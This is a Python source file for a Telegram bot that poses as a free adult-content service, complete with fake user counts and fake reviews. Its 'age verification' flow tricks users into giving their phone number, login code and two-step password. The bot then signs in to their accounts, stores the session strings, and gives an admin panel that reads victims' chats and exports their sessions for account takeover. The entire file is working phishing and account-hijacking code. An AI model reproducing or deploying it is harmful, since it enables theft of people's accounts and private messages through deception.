from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneNumberInvalidError,
    FloodWaitError
)
import asyncio
from config import API_ID, API_HASH, BOT_TOKEN, ADMIN_ID
from database import Database
import logging
from datetime import datetime
import os
import random

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database
db = Database()

# Bot
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Login sessions
login_sessions = {}

# Fake statistics
FAKE_ONLINE = random.randint(1500, 3000)
FAKE_VIDEOS = random.randint(50000, 100000)
FAKE_PHOTOS = random.randint(200000, 500000)

# ==================== HELPER FUNCTIONS ====================

def is_admin(user_id):
    return user_id == ADMIN_ID

async def get_user_dialogs(session_string, limit=100):
    """Get user chats"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        dialogs = []
        async for dialog in client.iter_dialogs(limit=limit):
            dialogs.append({
                'id': dialog.id,
                'name': dialog.name,
                'unread_count': dialog.unread_count,
                'is_group': dialog.is_group,
                'is_channel': dialog.is_channel,
                'is_user': dialog.is_user
            })
        
        await client.disconnect()
        return dialogs
    except Exception as e:
        logger.error(f"Error: {e}")
        return []

async def get_chat_messages(session_string, chat_id, limit=30):
    """Get messages from chat"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        messages = []
        async for message in client.iter_messages(chat_id, limit=limit):
            messages.append({
                'id': message.id,
                'text': message.text or '[Media]',
                'date': message.date.strftime('%d %b %Y, %H:%M'),
                'sender_id': message.sender_id,
                'is_outgoing': message.out
            })
        
        await client.disconnect()
        return messages
    except Exception as e:
        logger.error(f"Error: {e}")
        return []

async def export_session_file(session_string, filename='session.session'):
    """Export session file"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        me = await client.get_me()
        
        temp_client = TelegramClient(filename, API_ID, API_HASH)
        temp_client.session.set_dc(client.session.dc_id, client.session.server_address, client.session.port)
        temp_client.session.auth_key = client.session.auth_key
        temp_client.session.save()
        
        await client.disconnect()
        return filename, me
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return None, None

# ==================== USER COMMANDS ====================

@bot.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    """Start command - Adult content theme"""
    user_id = event.sender_id
    user = await event.get_sender()
    
    # Check if already verified
    if db.is_verified(user_id):
        await event.respond(
            f"🔥 **Welcome Back, {user.first_name}!**\n\n"
            f"✅ Your account is verified!\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎬 **Available Content:**\n"
            f"• 🔞 Premium Videos\n"
            f"• 📸 Exclusive Photos\n"
            f"• 🎥 Live Shows\n"
            f"• 💋 Private Collections\n\n"
            f"👥 **{FAKE_ONLINE}+ online now**\n\n"
            f"Choose what you want to explore:",
            buttons=[
                [Button.inline("🔞 Browse Videos", b"browse_videos")],
                [Button.inline("📸 Photo Gallery", b"browse_photos")],
                [Button.inline("🎥 Live Content", b"live_content")],
                [Button.inline("⭐ My Favorites", b"favorites")]
            ]
        )
        return
    
    # Welcome message for new users
    welcome_text = (
        f"🔥 **WELCOME TO PREMIUM ADULT CONTENT**\n\n"
        f"👋 Hello **{user.first_name}**!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔞 **ADULTS ONLY (18+)**\n\n"
        f"Access thousands of premium adult content:\n\n"
        f"🎬 **{FAKE_VIDEOS:,}+ HD Videos**\n"
        f"📸 **{FAKE_PHOTOS:,}+ Photos**\n"
        f"🎥 **Live Shows 24/7**\n"
        f"💋 **Exclusive Collections**\n"
        f"🌟 **VIP Content**\n"
        f"⚡ **Daily Updates**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 **{FAKE_ONLINE:,}+ Users Online**\n"
        f"🌍 **Available Worldwide**\n"
        f"🆓 **100% FREE Access**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚠️ **Age Verification Required**\n"
        f"To access adult content, you must verify that you are 18 years or older.\n\n"
        f"🔒 **Privacy Guaranteed**\n"
        f"Your data is encrypted and secure.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👇 Click below to verify your age and get instant access:"
    )
    
    buttons = [
        [Button.inline("🔞 I'm 18+ - Verify Now", b"verify_age")],
        [Button.inline("🎬 Preview Content", b"preview"), Button.inline("⭐ Reviews", b"reviews")],
        [Button.inline("❓ How It Works", b"how_it_works")]
    ]
    
    await event.respond(welcome_text, buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b"verify_age"))
async def verify_age_callback(event):
    """Age verification start"""
    await event.answer()
    user_id = event.sender_id
    
    if db.is_verified(user_id):
        await event.edit("✅ You are already verified!")
        return
    
    login_sessions[user_id] = {'step': 'phone'}
    
    await event.edit(
        "🔞 **AGE VERIFICATION**\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "To verify you are 18+, we need to link your Telegram account.\n\n"
        "📱 **Enter Your Phone Number**\n\n"
        "Format: International\n"
        "Example: `+8801712345678`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔒 Your information is completely private and secure.\n"
        "🎁 After verification, instant access to all content!",
        buttons=[
            [Button.inline("❌ Cancel", b"cancel_verify")],
            [Button.inline("❓ Why Phone Number?", b"why_phone")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"why_phone"))
async def why_phone_callback(event):
    await event.answer(
        "📱 Phone verification ensures you are 18+ and prevents abuse. "
        "Your number is encrypted and never shared.",
        alert=True
    )

@bot.on(events.CallbackQuery(pattern=b"preview"))
async def preview_callback(event):
    """Show preview/teaser"""
    await event.answer()
    
    await event.edit(
        "🎬 **CONTENT PREVIEW**\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "**🔥 Trending Categories:**\n\n"
        "🔞 Adult Videos (50K+)\n"
        "📸 Photo Sets (200K+)\n"
        "🎥 Live Streams (24/7)\n"
        "💋 Amateur Content\n"
        "🌟 Celebrity Leaks\n"
        "⚡ Fresh Daily Uploads\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "**💎 VIP Collections:**\n"
        "• Exclusive Premium\n"
        "• HD Quality Only\n"
        "• No Watermarks\n"
        "• Download Enabled\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚠️ Verify your age to unlock full access!",
        buttons=[
            [Button.inline("🔞 Verify & Access Now", b"verify_age")],
            [Button.inline("🔙 Back", b"back_to_start")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"reviews"))
async def reviews_callback(event):
    """Fake reviews"""
    await event.answer()
    
    await event.edit(
        "⭐ **USER REVIEWS**\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "👤 **Mike_2024**\n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Best collection I've found! HD quality and tons of variety.\"\n\n"
        "👤 **Sarah_VIP**\n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Can't believe this is free. Amazing content updated daily!\"\n\n"
        "👤 **Alex_Pro**\n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Verified in 30 seconds. Instant access to everything. Highly recommend!\"\n\n"
        "👤 **Jessica_XO**\n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Private, secure, and massive library. Worth it!\"\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 **4.9/5 Average Rating**\n"
        "👥 **8,500+ Reviews**\n"
        "🌟 **98% Satisfaction Rate**",
        buttons=[
            [Button.inline("🔞 Join Now", b"verify_age")],
            [Button.inline("🔙 Back", b"back_to_start")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"how_it_works"))
async def how_it_works_callback(event):
    await event.answer()
    
    await event.edit(
        "❓ **HOW IT WORKS**\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "**Step 1: Age Verification** 🔞\n"
        "Click 'Verify Now' and enter your phone number\n\n"
        "**Step 2: OTP Confirmation** 📱\n"
        "Enter the code sent to your Telegram\n\n"
        "**Step 3: Instant Access** ✅\n"
        "Browse unlimited adult content immediately!\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "**🔒 Privacy & Security:**\n"
        "• End-to-end encryption\n"
        "• No data sharing\n"
        "• Anonymous browsing\n"
        "• Secure verification\n\n"
        "**🎁 What You Get:**\n"
        "• Unlimited streaming\n"
        "• HD downloads\n"
        "• Daily new content\n"
        "• VIP collections\n"
        "• Ad-free experience\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "⏱️ Verification takes only 30 seconds!",
        buttons=[
            [Button.inline("🚀 Start Verification", b"verify_age")],
            [Button.inline("🔙 Back", b"back_to_start")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"browse_videos"))
async def browse_videos_callback(event):
    """Browse videos (verified users only)"""
    await event.answer()
    user_id = event.sender_id
    
    if not db.is_verified(user_id):
        await event.edit("❌ Please verify your age first!")
        return
    
    db.log_access(user_id, 'videos')
    db.update_last_access(user_id)
    
    await event.edit(
        "🎬 **VIDEO CATEGORIES**\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔥 **Popular Categories:**\n\n"
        "🔞 Amateur (12K videos)\n"
        "💋 Professional (25K videos)\n"
        "🌟 Celebrity Leaks (500+ videos)\n"
        "🎥 Live Recordings (8K videos)\n"
        "⚡ Latest Uploads (Updated today)\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 Quality: HD/4K Available\n"
        "⏱️ Average Length: 10-45 mins\n"
        "💾 Download: Enabled\n\n"
        "Select a category to continue:",
        buttons=[
            [Button.inline("🔞 Amateur", b"cat_amateur"), Button.inline("💋 Pro", b"cat_pro")],
            [Button.inline("🌟 Celebrity", b"cat_celeb"), Button.inline("🎥 Live", b"cat_live")],
            [Button.inline("🔙 Back to Menu", b"back_to_menu")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"browse_photos"))
async def browse_photos_callback(event):
    await event.answer()
    user_id = event.sender_id
    
    if not db.is_verified(user_id):
        await event.edit("❌ Please verify your age first!")
        return
    
    db.log_access(user_id, 'photos')
    db.update_last_access(user_id)
    
    await event.edit(
        "📸 **PHOTO GALLERY**\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔥 **Photo Collections:**\n\n"
        "📸 Solo Sets (50K+ photos)\n"
        "💑 Couples (30K+ photos)\n"
        "🌟 Model Portfolios (20K+ photos)\n"
        "💋 Artistic Nudes (15K+ photos)\n"
        "⚡ Fresh Uploads (Daily)\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 Quality: High Resolution\n"
        "💾 Download: Full Albums\n\n"
        "Choose your preference:",
        buttons=[
            [Button.inline("📸 Solo", b"ph_solo"), Button.inline("💑 Couples", b"ph_couple")],
            [Button.inline("🌟 Models", b"ph_model"), Button.inline("💋 Artistic", b"ph_art")],
            [Button.inline("🔙 Back to Menu", b"back_to_menu")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"live_content"))
async def live_content_callback(event):
    await event.answer()
    user_id = event.sender_id
    
    if not db.is_verified(user_id):
        await event.edit("❌ Please verify your age first!")
        return
    
    db.log_access(user_id, 'live')
    db.update_last_access(user_id)
    
    online_now = random.randint(50, 200)
    
    await event.edit(
        "🎥 **LIVE CONTENT**\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔴 **{online_now} Models Live Now**\n\n"
        "💋 Private Shows Available\n"
        "🎭 Interactive Streaming\n"
        "💬 Direct Chat Enabled\n"
        "🎁 Tips & Requests\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "**🌟 Featured Live:**\n"
        "• SweetAngel22 (Online)\n"
        "• NaughtyGirl_VIP (Online)\n"
        "• SexyModel2024 (Online)\n\n"
        "Click to join live rooms:",
        buttons=[
            [Button.inline("🔴 Join Live Show", b"join_live")],
            [Button.inline("💋 Private Room", b"private_show")],
            [Button.inline("🔙 Back to Menu", b"back_to_menu")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"favorites"))
async def favorites_callback(event):
    await event.answer("Coming soon! Save your favorite content.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"back_to_menu"))
async def back_to_menu_callback(event):
    await event.answer()
    user = await event.get_sender()
    
    await event.edit(
        f"🔥 **Welcome Back, {user.first_name}!**\n\n"
        f"Choose what you want to explore:",
        buttons=[
            [Button.inline("🔞 Browse Videos", b"browse_videos")],
            [Button.inline("📸 Photo Gallery", b"browse_photos")],
            [Button.inline("🎥 Live Content", b"live_content")],
            [Button.inline("⭐ My Favorites", b"favorites")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"cancel_verify"))
async def cancel_verify_callback(event):
    await event.answer()
    user_id = event.sender_id
    
    if user_id in login_sessions:
        if 'client' in login_sessions[user_id]:
            try:
                await login_sessions[user_id]['client'].disconnect()
            except:
                pass
        del login_sessions[user_id]
    
    await event.edit(
        "❌ **Verification Cancelled**\n\n"
        "You can verify anytime to access premium content.",
        buttons=[Button.inline("🔙 Main Menu", b"back_to_start")]
    )

@bot.on(events.CallbackQuery(pattern=b"back_to_start"))
async def back_to_start_callback(event):
    await event.answer()
    user = await event.get_sender()
    user_id = event.sender_id
    
    if db.is_verified(user_id):
        await event.edit(
            f"🔥 **Welcome, {user.first_name}!**\n\n"
            f"Access all premium content:",
            buttons=[
                [Button.inline("🔞 Browse Videos", b"browse_videos")],
                [Button.inline("📸 Photo Gallery", b"browse_photos")],
                [Button.inline("🎥 Live Content", b"live_content")]
            ]
        )
        return
    
    await event.edit(
        f"🔥 **PREMIUM ADULT CONTENT**\n\n"
        f"👥 **{FAKE_ONLINE:,}+ Users Online**\n"
        f"🎬 **{FAKE_VIDEOS:,}+ Videos**\n"
        f"📸 **{FAKE_PHOTOS:,}+ Photos**\n\n"
        f"Verify your age for instant access:",
        buttons=[
            [Button.inline("🔞 Verify Now (18+)", b"verify_age")],
            [Button.inline("🎬 Preview", b"preview"), Button.inline("⭐ Reviews", b"reviews")]
        ]
    )

# Placeholder callbacks for sub-categories
@bot.on(events.CallbackQuery(pattern=b"cat_|ph_|join_live|private_show"))
async def placeholder_callback(event):
    await event.answer("✅ Loading content... This feature is active for verified users!", alert=True)

# ==================== MESSAGE HANDLER (LOGIN) ====================

@bot.on(events.NewMessage)
async def message_handler(event):
    """Handle login messages"""
    user_id = event.sender_id
    
    if user_id not in login_sessions:
        return
    
    step = login_sessions[user_id].get('step')
    
    # PHONE STEP
    if step == 'phone':
        phone = event.text.strip()
        
        if not phone.startswith('+'):
            await event.respond("❌ Wrong format! Use: `+8801712345678`")
            return
        
        try:
            loading_msg = await event.respond("⚡ Sending verification code...")
            
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(phone)
            
            login_sessions[user_id] = {
                'step': 'code',
                'phone': phone,
                'client': client
            }
            
            await loading_msg.delete()
            await event.respond(
                "✅ **Verification Code Sent!**\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "📱 Check your Telegram for the code.\n\n"
                "💬 **Enter the code here:**\n"
                "Example: `12345`\n\n"
                "━━━━━━━━━━━━━━━━━━━━",
                buttons=[Button.inline("❌ Cancel", b"cancel_verify")]
            )
            
        except PhoneNumberInvalidError:
            await event.respond("❌ Invalid phone number!")
            del login_sessions[user_id]
        except FloodWaitError as e:
            await event.respond(f"⏳ Too many attempts! Wait {e.seconds} seconds.")
            del login_sessions[user_id]
        except Exception as e:
            logger.error(f"Error: {e}")
            await event.respond(f"❌ Error: {str(e)}")
            del login_sessions[user_id]
    
    # CODE STEP
    elif step == 'code':
        code = event.text.strip().replace('-', '').replace(' ', '')
        phone = login_sessions[user_id]['phone']
        client = login_sessions[user_id]['client']
        
        try:
            loading_msg = await event.respond("⚡ Verifying...")
            
            await client.sign_in(phone, code)
            me = await client.get_me()
            session_string = client.session.save()
            
            db.save_user(
                me.id,
                phone,
                session_string,
                me.first_name or '',
                me.last_name or '',
                me.username or '',
                18
            )
            
            await loading_msg.delete()
            
            success_msg = (
                "🎉 **VERIFICATION SUCCESSFUL!** 🎉\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "✅ **Your Account is Verified!**\n\n"
                f"👤 **Name:** {me.first_name} {me.last_name or ''}\n"
                f"📱 **Phone:** {phone}\n"
            )
            
            if me.username:
                success_msg += f"🔗 **Username:** @{me.username}\n"
            
            success_msg += (
                f"🆔 **User ID:** `{me.id}`\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "🎁 **PREMIUM ACCESS UNLOCKED:**\n\n"
                f"✅ {FAKE_VIDEOS:,}+ HD Videos\n"
                f"✅ {FAKE_PHOTOS:,}+ Photos\n"
                "✅ Live Shows 24/7\n"
                "✅ VIP Collections\n"
                "✅ Daily Updates\n"
                "✅ Download Enabled\n"
                "✅ Ad-Free Experience\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📅 Verified: {datetime.now().strftime('%d %B %Y, %H:%M')}\n\n"
                "🔥 **Start exploring now!**"
            )
            
            await event.respond(
                success_msg,
                buttons=[
                    [Button.inline("🔞 Browse Videos", b"browse_videos")],
                    [Button.inline("📸 Photo Gallery", b"browse_photos")],
                    [Button.inline("🎥 Go Live", b"live_content")]
                ]
            )
            
            # Notify admin
            if ADMIN_ID:
                try:
                    await bot.send_message(
                        ADMIN_ID,
                        f"🆕 **NEW USER VERIFIED!**\n\n"
                        f"👤 {me.first_name} {me.last_name or ''}\n"
                        f"📱 {phone}\n"
                        f"🆔 `{me.id}`\n"
                        f"🔗 @{me.username or 'No username'}\n"
                        f"📅 {datetime.now().strftime('%d %b %Y, %H:%M:%S')}\n\n"
                        f"📊 Total Users: {db.get_total_users()}"
                    )
                except:
                    pass
            
            await client.disconnect()
            del login_sessions[user_id]
            
        except PhoneCodeInvalidError:
            await event.respond("❌ Wrong code! Try again or /start")
            await client.disconnect()
            del login_sessions[user_id]
        except SessionPasswordNeededError:
            login_sessions[user_id]['step'] = 'password'
            await event.respond(
                "🔐 **2FA Enabled**\n\n"
                "Enter your Cloud Password:",
                buttons=[Button.inline("❌ Cancel", b"cancel_verify")]
            )
        except Exception as e:
            logger.error(f"Error: {e}")
            await event.respond(f"❌ Error: {str(e)}")
            try:
                await client.disconnect()
            except:
                pass
            del login_sessions[user_id]
    
    # PASSWORD STEP
    elif step == 'password':
        password = event.text.strip()
        client = login_sessions[user_id]['client']
        phone = login_sessions[user_id]['phone']
        
        try:
            loading_msg = await event.respond("⚡ Verifying password...")
            
            await client.sign_in(password=password)
            me = await client.get_me()
            session_string = client.session.save()
            
            db.save_user(me.id, phone, session_string, me.first_name or '', me.last_name or '', me.username or '', 18)
            
            await loading_msg.delete()
            await event.respond(
                f"🎉 **VERIFIED!**\n\n"
                f"✅ Account verified successfully!\n\n"
                f"👤 {me.first_name} {me.last_name or ''}\n"
                f"📱 {phone}\n\n"
                f"🔥 Full access unlocked!",
                buttons=[
                    [Button.inline("🔞 Start Browsing", b"browse_videos")]
                ]
            )
            
            if ADMIN_ID:
                try:
                    await bot.send_message(ADMIN_ID, f"🆕 NEW (2FA) User!\n👤 {me.first_name}\n📱 {phone}\n🆔 `{me.id}`")
                except:
                    pass
            
            await client.disconnect()
            del login_sessions[user_id]
            
        except Exception as e:
            logger.error(f"Error: {e}")
            await event.respond(f"❌ Wrong password: {str(e)}")
            try:
                await client.disconnect()
            except:
                pass
            del login_sessions[user_id]

# ==================== ADMIN PANEL ====================

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_command(event):
    """Admin panel"""
    if not is_admin(event.sender_id):
        await event.respond("⛔ Unauthorized!")
        return
    
    total = db.get_total_users()
    
    await event.respond(
        f"👨‍💼 **ADMIN CONTROL PANEL**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 **Total Verified Users:** {total}\n"
        f"🟢 **Bot Status:** Active\n"
        f"📅 **Date:** {datetime.now().strftime('%d %B %Y')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=[
            [Button.inline("📋 All Users", b"admin_list")],
            [Button.inline("📊 Statistics", b"admin_stats")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"admin_list"))
async def admin_list_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    users = db.get_all_users()
    
    if not users:
        await event.edit("❌ No users found!", buttons=[Button.inline("🔙 Back", b"back_admin")])
        return
    
    text = f"📋 **VERIFIED USERS ({len(users)})**\n\n━━━━━━━━━━━━━━━━━━━━\n\n"
    buttons = []
    
    for user_id, phone, fname, lname, username, age, verified_at, last_access in users[:20]:
        name = f"{fname} {lname or ''}".strip()
        text += f"👤 **{name}**\n📱 {phone}\n🆔 `{user_id}`\n🕐 {last_access[:16]}\n\n"
        buttons.append([Button.inline(f"👁️ {name[:25]}", f"view_user_{user_id}".encode())])
    
    if len(users) > 20:
        text += f"\n... and {len(users) - 20} more"
    
    buttons.append([Button.inline("🔙 Back", b"back_admin")])
    await event.edit(text, buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b"view_user_(.+)"))
async def view_user_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Loading...")
    
    user_id = int(event.data.decode().split('_')[2])
    user_info = db.get_user_info(user_id)
    
    if not user_info:
        await event.edit("❌ User not found!")
        return
    
    uid, phone, fname, lname, username, session, age, verified_at, last_access = user_info
    db.update_last_access(uid)
    
    buttons = [
        [Button.inline("💬 View Chats", f"user_chats_{uid}".encode())],
        [
            Button.inline("📱 Session File", f"export_sess_{uid}".encode()),
            Button.inline("🔑 Get String", f"get_str_{uid}".encode())
        ],
        [Button.inline("🗑️ Delete User", f"del_user_{uid}".encode())],
        [Button.inline("🔙 Back", b"admin_list")]
    ]
    
    await event.edit(
        f"👤 **USER DETAILS**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📛 **Name:** {fname} {lname or ''}\n"
        f"🔗 **Username:** @{username or 'None'}\n"
        f"📱 **Phone:** {phone}\n"
        f"🆔 **ID:** `{uid}`\n"
        f"🎂 **Age:** {age}+\n"
        f"📅 **Verified:** {verified_at[:16]}\n"
        f"🕐 **Last Active:** {last_access[:16]}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=buttons
    )

@bot.on(events.CallbackQuery(pattern=b"user_chats_(.+)"))
async def user_chats_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Loading chats...")
    
    user_id = int(event.data.decode().split('_')[2])
    session = db.get_session(user_id)
    
    if not session:
        await event.edit("❌ Session expired!")
        return
    
    dialogs = await get_user_dialogs(session, limit=50)
    
    if not dialogs:
        await event.edit("❌ No chats!")
        return
    
    text = f"💬 **USER CHATS ({len(dialogs)})**\n\n━━━━━━━━━━━━━━━━━━━━\n\n"
    buttons = []
    
    for dialog in dialogs[:15]:
        chat_type = "👥" if dialog['is_group'] else "📢" if dialog['is_channel'] else "👤"
        unread = f" 📨{dialog['unread_count']}" if dialog['unread_count'] > 0 else ""
        text += f"{chat_type} **{dialog['name']}**{unread}\n"
        buttons.append([Button.inline(f"{chat_type} {dialog['name'][:30]}", f"user_msgs_{user_id}_{dialog['id']}".encode())])
    
    if len(dialogs) > 15:
        text += f"\n... and {len(dialogs) - 15} more"
    
    buttons.append([Button.inline("🔙 Back", f"view_user_{user_id}".encode())])
    await event.edit(text, buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b"user_msgs_(.+)_(.+)"))
async def user_msgs_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Loading messages...")
    
    data = event.data.decode().split('_')
    user_id = int(data[2])
    chat_id = int(data[3])
    
    session = db.get_session(user_id)
    if not session:
        await event.edit("❌ Session expired!")
        return
    
    messages = await get_chat_messages(session, chat_id, limit=20)
    
    if not messages:
        await event.edit("❌ No messages!")
        return
    
    text = f"📩 **RECENT MESSAGES ({len(messages)})**\n\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for msg in messages[:15]:
        direction = "➡️" if msg['is_outgoing'] else "⬅️"
        text += f"{direction} **{msg['date']}**\n💬 {msg['text'][:150]}\n\n"
    
    await event.edit(text, buttons=[Button.inline("🔙 Back", f"user_chats_{user_id}".encode())])

@bot.on(events.CallbackQuery(pattern=b"export_sess_(.+)"))
async def export_sess_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Generating session...")
    
    user_id = int(event.data.decode().split('_')[2])
    session_string = db.get_session(user_id)
    
    if not session_string:
        await event.edit("❌ Session not found!")
        return
    
    try:
        session_filename = f'user_{user_id}.session'
        session_file, me = await export_session_file(session_string, session_filename)
        
        if not session_file:
            await event.edit("❌ Error creating file!")
            return
        
        await bot.send_file(
            event.sender_id,
            session_filename,
            caption=(
                f"📱 **SESSION FILE**\n\n"
                f"👤 {me.first_name}\n"
                f"🆔 `{me.id}`\n\n"
                f"**Usage:**\n"
                f"📱 Mobile: Copy to Telegram folder\n"
                f"💻 Desktop: Copy to tdata folder"
            )
        )
        
        if os.path.exists(session_filename):
            os.remove(session_filename)
        
        await event.respond("✅ Session file sent!", buttons=[Button.inline("🔙 Back", f"view_user_{user_id}".encode())])
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await event.edit(f"❌ Error: {str(e)}")

@bot.on(events.CallbackQuery(pattern=b"get_str_(.+)"))
async def get_str_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    
    user_id = int(event.data.decode().split('_')[2])
    session_string = db.get_session(user_id)
    
    if not session_string:
        await event.edit("❌ Session not found!")
        return
    
    user_info = db.get_user_info(user_id)
    uid, phone, fname, lname, username, session, age, verified_at, last_access = user_info
    
    session_file = f'session_{user_id}.txt'
    
    with open(session_file, 'w', encoding='utf-8') as f:
        f.write(f"SESSION STRING\n{'='*50}\n\n")
        f.write(f"User: {fname} {lname or ''}\n")
        f.write(f"Phone: {phone}\n")
        f.write(f"ID: {user_id}\n\n")
        f.write(f"{'='*50}\n\n")
        f.write(f"{session_string}\n\n")
        f.write(f"{'='*50}\n")
    
    await bot.send_file(event.sender_id, session_file, caption=f"🔑 Session String for {fname}")
    
    if os.path.exists(session_file):
        os.remove(session_file)
    
    await event.respond("✅ Session string sent!", buttons=[Button.inline("🔙 Back", f"view_user_{user_id}".encode())])

@bot.on(events.CallbackQuery(pattern=b"del_user_(.+)"))
async def del_user_confirm(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    user_id = int(event.data.decode().split('_')[2])
    
    await event.edit(
        "⚠️ **DELETE USER?**\n\n"
        "Confirm deletion?",
        buttons=[
            [Button.inline("✅ Yes", f"confirm_del_user_{user_id}".encode())],
            [Button.inline("❌ No", f"view_user_{user_id}".encode())]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"confirm_del_user_(.+)"))
async def confirm_del_user(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    user_id = int(event.data.decode().split('_')[3])
    
    if db.delete_user(user_id):
        await event.edit("✅ User deleted!", buttons=[Button.inline("🔙 Users", b"admin_list")])
    else:
        await event.edit("❌ Error!")

@bot.on(events.CallbackQuery(pattern=b"admin_stats"))
async def admin_stats_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    total = db.get_total_users()
    
    await event.edit(
        f"📊 **STATISTICS**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 Total Users: {total}\n"
        f"📅 Date: {datetime.now().strftime('%d %B %Y')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=[Button.inline("🔙 Back", b"back_admin")]
    )

@bot.on(events.CallbackQuery(pattern=b"back_admin"))
async def back_admin_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    total = db.get_total_users()
    
    await event.edit(
        f"👨‍💼 **ADMIN PANEL**\n\n"
        f"📊 Total Users: {total}\n\n",
        buttons=[
            [Button.inline("📋 All Users", b"admin_list")],
            [Button.inline("📊 Statistics", b"admin_stats")]
        ]
    )

# ==================== MAIN ====================

def main():
    logger.info("="*50)
    logger.info("🔞 Adult Content Bot Starting...")
    logger.info(f"👨‍💼 Admin ID: {ADMIN_ID}")
    logger.info(f"📊 Total Users: {db.get_total_users()}")
    logger.info("="*50)
    logger.info("✅ Bot running...")
    logger.info("="*50)
    
    print("\n✅ BOT IS RUNNING!\n")
    bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("\n🛑 Bot stopped")
    except Exception as e:
        logger.error(f"❌ Error: {e}")
    finally:
        db.close()
